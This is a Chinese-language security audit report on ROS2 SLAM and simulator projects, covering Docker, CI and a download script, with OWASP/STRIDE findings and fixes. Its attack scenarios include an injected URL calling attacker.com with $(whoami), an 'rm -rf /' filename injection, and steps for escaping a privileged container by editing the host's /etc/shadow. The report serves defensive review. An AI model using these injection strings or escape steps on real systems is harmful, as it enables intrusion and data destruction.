# 🔒 安全审查报告 — rosiwit_slam + rosiwit_simulator

**审查日期**: 2026-05-05  
**审查员**: 安全审查师 (AI开发团队)  
**项目版本**: rosiwit_slam v2.0 (ROS2 Humble 迁移) + rosiwit_simulator (ROS2 Humble)  
**审查范围**: `rosiwit_ws/src/rosiwit_slam/` + `rosiwit_ws/src/rosiwit_simulator/` (源代码 + Docker + CI/CD)  
**审查标准**: OWASP Top 10 (2021) + STRIDE 威胁模型

---

## 📋 审计摘要

| OWASP Top 10 检查项 | 状态 | 发现数 |
|---|---|---|
| A01 — 失效的访问控制 | ⚠️ 部分通过 | 2 |
| A02 — 加密失败 | ✅ 通过 | 0 |
| A03 — 注入 | ⚠️ 存在风险 | 1 |
| A04 — 不安全的设计 | ⚠️ 存在风险 | 1 |
| A05 — 安全配置错误 | ❌ 未通过 | 4 |
| A06 — 易受攻击的组件 | ✅ 通过 | 0 |
| A07 — 认证失败 | ⚠️ 部分通过 | 1 |
| A08 — 软件和数据完整性 | ⚠️ 存在风险 | 1 |
| A09 — 日志和监控失败 | ✅ 通过 | 0 |
| A10 — SSRF | ✅ 通过 | 0 |

**总计**: 10 个发现 (Critical: 1, High: 4, Medium: 4, Low: 1)  
**发布建议**: ⛔ **阻塞发布** — 存在 1 个 Critical 级别漏洞

---

## 🚨 漏洞列表 (按严重程度排序)

### [CRITICAL] SEC-001: SLAM 容器以 root 用户运行

| 属性 | 值 |
|---|---|
| **严重程度** | 🔴 Critical |
| **OWASP 分类** | A05 — 安全配置错误 |
| **置信度** | 10/10 |
| **文件位置** | `rosiwit_slam/docker/Dockerfile:157-182` |
| **影响** | 容器逃逸后获取宿主机 root 权限 |

**详细描述**:
Dockerfile 在第 157 行创建了非 root 用户 `slam_user`:
```dockerfile
RUN useradd -m -s /bin/bash slam_user && \
    usermod -aG video,plugdev slam_user
```
但**从未使用 `USER slam_user` 切换用户**。容器默认以 root 身份运行。同时 `Dockerfile.devel` (第 1-145 行) 完全没有创建非 root 用户。

**利用场景**:
1. 攻击者通过 SLAM 节点的 ROS2 话题注入恶意 PointCloud2 数据
2. 触发 SLAM 进程中的缓冲区溢出（PCL 库历史上多次出现此类漏洞）
3. 获得容器内 root shell
4. 配合 `privileged: true` (SEC-002)，直接访问宿主机所有设备文件，完成容器逃逸

**修复建议**:
```dockerfile
# 在 Dockerfile 末尾 CMD 之前添加:
USER slam_user
```
对于 `Dockerfile.devel`，同样添加非 root 用户并使用 `USER` 指令。

---

### [HIGH] SEC-002: SLAM Docker Compose 使用 privileged 特权模式

| 属性 | 值 |
|---|---|
| **严重程度** | 🟠 High |
| **OWASP 分类** | A05 — 安全配置错误 |
| **置信度** | 10/10 |
| **文件位置** | `rosiwit_slam/docker/docker-compose.yml:40` |
| **影响** | 容器拥有宿主机全部设备访问权限，可直接逃逸 |

**详细描述**:
```yaml
privileged: true    # line 40
```
`privileged: true` 赋予容器访问宿主机**所有设备**的权限，包括 `/dev/sda`（磁盘）、`/dev/mem`（内存）等。容器可以加载内核模块、修改宿主机网络配置、挂载文件系统。

**利用场景**:
1. 攻击者在容器内运行 `fdisk -l` 查看宿主机磁盘
2. 挂载宿主机根文件系统: `mount /dev/sda1 /mnt`
3. 修改 `/mnt/etc/shadow` 或植入后门: `echo 'attacker:...' >> /mnt/etc/shadow`

**修复建议**:
```yaml
# 移除 privileged: true，改用最小权限:
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
cap_add:
  - SYS_PTRACE    # 仅在需要 GPU/调试时添加
```
如需 GPU 支持，使用 `deploy.resources.reservations.devices` 而非 `privileged`。

---

### [HIGH] SEC-003: 命令注入风险 — shell=True + 字符串拼接

| 属性 | 值 |
|---|---|
| **严重程度** | 🟠 High |
| **OWASP 分类** | A03 — 注入 |
| **置信度** | 9/10 |
| **文件位置** | `rosiwit_slam/scripts/fetch_ntu_viral.py:187,210` |
| **影响** | 远程代码执行 (RCE) |

**详细描述**:
```python
# line 187
result = subprocess.run(
    download_cmd,      # 字符串形式的命令
    shell=True,        # 通过 shell 执行
    ...
)

# line 210
return f"wget {resume_flag} -O '{output_path}' '{url}'"
```

`_build_download_command` 方法（第 206-222 行）将 `url` 和 `output_path` 直接拼接到 shell 命令中。虽然有单引号包裹，但单引号内的 `'$(malicious_command)'` 仍可逃逸。

**利用场景**:
1. 攻击者搭建恶意服务器，提供包含注入的下载 URL，例如:
   `https://evil.com/$(curl http://attacker.com/$(whoami))/data.zip`
2. 脚本执行时 URL 被拼接到 shell 命令中
3. `$(curl ...)` 在 shell 中被展开执行，实现远程代码执行
4. 或通过 `output_path` 参数注入: `file'$(rm -rf /)'.bag`

**修复建议**:
```python
# 使用列表形式，不通过 shell:
result = subprocess.run(
    ["wget", "-c", "-O", str(output_file), seq_info["download_url"]],
    check=True,
    cwd=str(self.output_dir)
)
```

---

### [HIGH] SEC-004: ROS_DOMAIN_ID=0 默认域导致跨域通信暴露

| 属性 | 值 |
|---|---|
| **严重程度** | 🟠 High |
| **OWASP 分类** | A01 — 失效的访问控制 |
| **置信度** | 9/10 |
| **文件位置** | `rosiwit_slam/docker/Dockerfile:166`, `docker/Dockerfile.devel:123`, `DEPLOYMENT.md:391` |
| **影响** | 同网段任意 ROS2 节点可读取/注入传感器数据 |

**详细描述**:
ROS2 DDS 默认域 ID 为 0。所有使用默认域 ID 的 ROS2 节点均可互相发现和通信，没有认证机制。

多处设置 `ROS_DOMAIN_ID=0`:
- `Dockerfile:166`: `ENV ROS_DOMAIN_ID=0`
- `Dockerfile.devel:123`: `ENV ROS_DOMAIN_ID=0`
- `DEPLOYMENT.md:391`: `export ROS_DOMAIN_ID=0`

**利用场景**:
1. 同网段攻击者启动恶意 ROS2 节点
2. 自动发现并订阅 `/velodyne_points`（激光雷达数据）和 `/imu`（IMU 数据）
3. 窃取环境建图数据，推断工厂布局、设备位置等敏感信息
4. 或发布伪造的 `/cmd_vel` 消息，控制机器人移动到危险位置

**修复建议**:
```dockerfile
# 使用非零且不常见的域 ID:
ENV ROS_DOMAIN_ID=42

# 配合 DDS 安全配置 (SROS2):
# ros2 security create_keystore ...
# ros2 security create_enclave ...
```

---

### [HIGH] SEC-005: Jenkinsfile 在 CI 流水线中使用 --privileged

| 属性 | 值 |
|---|---|
| **严重程度** | 🟠 High |
| **OWASP 分类** | A05 — 安全配置错误 |
| **置信度** | 9/10 |
| **文件位置** | `rosiwit_slam/Jenkinsfile:27` |
| **影响** | CI 构建节点被攻陷后可逃逸到宿主机 |

**详细描述**:
Jenkinsfile 在构建阶段使用 `--privileged` 标志运行 Docker 容器，赋予构建容器完整的宿主机访问权限。如果攻击者能向代码仓库提交恶意代码（如恶意 CMake 脚本），可在构建阶段逃逸到 CI 宿主机。

**利用场景**:
1. 攻击者 fork 项目并提交包含恶意 `cmake` 指令的 PR
2. Jenkins 自动触发构建，在 `--privileged` 容器中执行恶意代码
3. 攻击者获得 CI 服务器 root 权限
4. 窃取 CI 服务器上的 SSH 密钥、部署凭据、其他项目源码

**修复建议**:
```groovy
// 移除 --privileged，改用 --cap-add 限制:
args '--cap-add=SYS_PTRACE --security-opt no-new-privileges'
```

---

### [MEDIUM] SEC-006: 开发镜像暴露 Jupyter 端口无认证

| 属性 | 值 |
|---|---|
| **严重程度** | 🟡 Medium |
| **OWASP 分类** | A07 — 认证失败 |
| **置信度** | 9/10 |
| **文件位置** | `rosiwit_slam/docker/Dockerfile.devel:102-112,142` |
| **影响** | 未授权访问 Jupyter Notebook，执行任意代码 |

**详细描述**:
`Dockerfile.devel` 安装了 Jupyter 并暴露端口 8888:
```dockerfile
RUN pip3 install --no-cache-dir ... jupyter ...   # line 107
EXPOSE 8888/tcp  # Jupyter                          # line 142
```
但未配置 Jupyter 认证（密码或 token）。如果开发环境部署在可访问的网络上，任何人都可以通过 8888 端口访问 Jupyter 并执行任意 Python 代码。

**修复建议**:
- 添加 Jupyter 配置: `jupyter notebook --NotebookApp.token='<secure-token>'`
- 或仅绑定 localhost: `jupyter notebook --ip=127.0.0.1`
- 或在 docker-compose 中添加 `ports: "127.0.0.1:8888:8888"`

---

### [MEDIUM] SEC-007: Docker Compose 使用 network_mode: host 和 ipc: host

| 属性 | 值 |
|---|---|
| **严重程度** | 🟡 Medium |
| **OWASP 分类** | A05 — 安全配置错误 |
| **置信度** | 9/10 |
| **文件位置** | `rosiwit_simulator/docker/docker-compose.yml:41,44`, `rosiwit_slam/docker/docker-compose.yml:42-45` |
| **影响** | 容器与宿主机共享网络栈和 IPC，失去隔离 |

**详细描述**:
```yaml
network_mode: host    # line 41 (simulator)
ipc: host             # line 44 (simulator)
network_mode: host    # line 42 (slam)
ipc: host             # line 45 (slam)
```

`network_mode: host` 使容器与宿主机共享网络命名空间，容器可访问所有宿主机网络接口和端口。`ipc: host` 共享 IPC 命名空间，容器可操作宿主机的共享内存和信号量。

**利用场景**:
1. 攻击者通过 ROS2 漏洞进入容器
2. 通过共享网络扫描宿主机内部服务（如 127.0.0.1 上的数据库）
3. 通过共享 IPC 读写其他进程的共享内存

**修复建议**:
- 使用自定义 Docker 网络 + 端口映射替代 `network_mode: host`
- 如需 DDS 组播发现，使用 `macvlan` 网络驱动
- 仅在确实需要 GPU 共享内存时使用 `ipc: host`

---

### [MEDIUM] SEC-008: 依赖库从 GitHub 无校验直接克隆构建

| 属性 | 值 |
|---|---|
| **严重程度** | 🟡 Medium |
| **OWASP 分类** | A08 — 软件和数据完整性 |
| **置信度** | 8/10 |
| **文件位置** | `rosiwit_slam/docker/Dockerfile:77-99`, `docker/Dockerfile.devel:77-99` |
| **影响** | 供应链攻击 — 恶意代码植入 |

**详细描述**:
```dockerfile
# line 77-84
RUN git clone https://github.com/strasdat/Sophus.git /tmp/Sophus && \
    cd /tmp/Sophus && \
    git checkout 1.22.10 && \
    ...
# line 87-99
RUN git clone https://github.com/borglab/gtsam.git /tmp/gtsam && \
    cd /tmp/gtsam && \
    git checkout 4.2a9 && \
    ...
```

虽然使用了 `git checkout` 固定版本，但没有验证 commit hash 或 GPG 签名。如果 GitHub 仓库被劫持或 tag 被修改，将构建包含恶意代码的依赖库。

**修复建议**:
```dockerfile
# 使用 commit hash 而非 tag:
RUN git clone https://github.com/strasdat/Sophus.git /tmp/Sophus && \
    cd /tmp/Sophus && \
    git checkout <full-commit-hash> && \
    git verify-commit <commit-hash>  # 启用 GPG 验证
```
或使用 vcpkg/conan 等包管理器，这些工具内置了校验机制。

---

### [MEDIUM] SEC-009: SLAM Docker 构建缺少 .dockerignore

| 属性 | 值 |
|---|---|
| **严重程度** | 🟡 Medium |
| **OWASP 分类** | A05 — 安全配置错误 |
| **置信度** | 8/10 |
| **文件位置** | `rosiwit_slam/docker/` (缺少 `.dockerignore` 文件) |
| **影响** | 敏感构建产物和临时文件泄露到 Docker 镜像层 |

**详细描述**:
`rosiwit_slam/docker/` 目录下没有 `.dockerignore` 文件。Docker 构建时可能将本地 `build/`、`install/`、`log/` 目录、`.git/` 历史以及测试 bag 文件复制到镜像中，增加镜像体积并泄露源码历史。

**修复建议**:
创建 `rosiwit_slam/docker/.dockerignore`:
```
.git/
build/
install/
log/
*.bag
*.pcd
*.ply
data/
bags/
maps/
```

---

### [LOW] SEC-010: DDS 发现端口范围暴露过宽

| 属性 | 值 |
|---|---|
| **严重程度** | 🟢 Low |
| **OWASP 分类** | A04 — 不安全的设计 |
| **置信度** | 8/10 |
| **文件位置** | `rosiwit_slam/docker/Dockerfile:175-176`, `docker/Dockerfile.devel:140-141` |
| **影响** | 扩大攻击面，暴露不必要的端口 |

**详细描述**:
```dockerfile
EXPOSE 7400-7500/udp
EXPOSE 7400-7500/tcp
```
暴露了 101 个 UDP 和 TCP 端口，远超 ROS2 DDS 实际所需的端口数（通常 2-4 个）。

**修复建议**:
- 使用 DDS 配置固定端口范围（通常 1-2 个域 × 2 个端口）
- 在 `CycloneDDS.xml` 中配置具体的单播端口

---

## 🔍 STRIDE 威胁模型分析

| 威胁类型 | 风险等级 | 分析 |
|---|---|---|
| **S** — Spoofing (身份伪造) | 🟡 Medium | ROS2 DDS 无内置认证，同域节点可伪装身份。关联 SEC-004。 |
| **T** — Tampering (数据篡改) | 🟠 High | 攻击者可向 `/cmd_vel`、`/velodyne_points` 发布伪造数据，导致 SLAM 建图错误或机器人碰撞。关联 SEC-004, SEC-007。 |
| **R** — Repudiation (否认) | 🟢 Low | ROS2 节点缺乏操作审计日志，无法追溯数据来源。 |
| **I** — Information Disclosure (信息泄露) | 🟠 High | SEC-001 (root 运行) + SEC-002 (privileged) + SEC-007 (host网络) 组合可导致宿主机数据泄露。SLAM 地图数据可通过 DDS 直接窃取。 |
| **D** — Denial of Service (拒绝服务) | 🟡 Medium | 大量伪造的 PointCloud2 数据可耗尽 SLAM 计算资源，导致系统停滞。 |
| **E** — Elevation of Privilege (权限提升) | 🔴 Critical | SEC-001 (root容器) + SEC-002 (privileged) = 完整的容器逃逸链，攻击者可直接获取宿主机 root 权限。 |

---

## ✅ 通过的检查项

以下 OWASP Top 10 项目在此项目中未发现安全风险:

1. **A02 — 加密失败**: 未发现明文存储密码或传输敏感数据。SLAM 点云数据不涉及加密需求。
2. **A06 — 易受攻击的组件**: 所有 ROS2 依赖使用 `ros-humble-*` 官方包，版本为 Humble LTS。
3. **A09 — 日志和监控失败**: ROS2 节点通过 `RCLCPP_INFO/ERROR` 记录关键事件，Docker 配置了日志轮转。
4. **A10 — SSRF**: 无用户输入的 HTTP 请求功能（`fetch_ntu_viral.py` 使用硬编码 URL，非用户可控）。

---

## 📊 rosiwit_simulator 对比说明

`rosiwit_simulator` 的 Docker 配置已做了良好的安全加固:
- ✅ 创建非 root 用户 `ros_user` (UID 1000) 并使用 `USER ros_user`
- ✅ `security_opt: no-new-privileges:true`
- ✅ `cap_drop: ALL` + 最小 `cap_add`
- ✅ 资源限制 (mem_limit, cpus)
- ✅ 健康检查 (healthcheck)
- ✅ 日志轮转 (logging driver with max-size/max-file)
- ✅ `.dockerignore` 文件

`rosiwit_slam` 的 Docker 配置**应参照 simulator 的安全标准进行对齐加固**。

---

## 🛡️ 修复优先级建议

| 优先级 | 漏洞 ID | 修复工作量 | 建议截止 |
|---|---|---|---|
| **P0** (阻塞发布) | SEC-001 | 1 行代码 | 立即 |
| **P0** (阻塞发布) | SEC-002 | 5 行 YAML | 立即 |
| **P1** | SEC-003 | 30 行代码重构 | 本次迭代 |
| **P1** | SEC-004 | 全局替换 0→42 | 本次迭代 |
| **P1** | SEC-005 | 1 行修改 | 本次迭代 |
| **P2** | SEC-006 | 添加启动参数 | 下次迭代 |
| **P2** | SEC-007 | 网络架构调整 | 下次迭代 |
| **P2** | SEC-008 | Dockerfile 修改 | 下次迭代 |
| **P3** | SEC-009 | 添加 .dockerignore | 下次迭代 |
| **P3** | SEC-010 | 端口范围收窄 | 可选 |

---

## 📝 误报排除说明

| 疑似风险 | 排除原因 |
|---|---|
| `scripts/generate_simulated_data.py` 中的 `subprocess` 调用 | 命令参数为硬编码常量，不接受外部输入，无注入风险 |
| `scripts/convert_bag.py` 中的 `subprocess.run` | 使用列表形式参数传递 (`shell=False` 默认值)，不存在命令注入 |
| `package.xml` 中的依赖版本未锁定 | ROS2 Humble 使用 apt 包管理，版本由发行版固定，非独立库 |
| C++ 源码中的文件操作 (`map_persistence.h`) | 路径来源于 ROS2 参数声明 (非用户输入)，且仅在容器内操作 |

---

## 🏁 结论

**⛔ 阻塞发布** — `rosiwit_slam` 的 Docker 部署配置存在 Critical 级安全漏洞。

核心问题: **SEC-001 (root 运行) + SEC-002 (privileged 模式) 构成完整的容器逃逸攻击链**。攻击者可从 ROS2 话题注入 → 容器内 root shell → 宿主机 root 权限。

建议: 先修复 SEC-001 和 SEC-002（各仅需 1-5 行修改），参照 `rosiwit_simulator` 的安全加固标准对齐 SLAM 容器配置后，方可发布。

---

*报告由安全审查师生成 | AI 开发团队 | 2026-05-05*
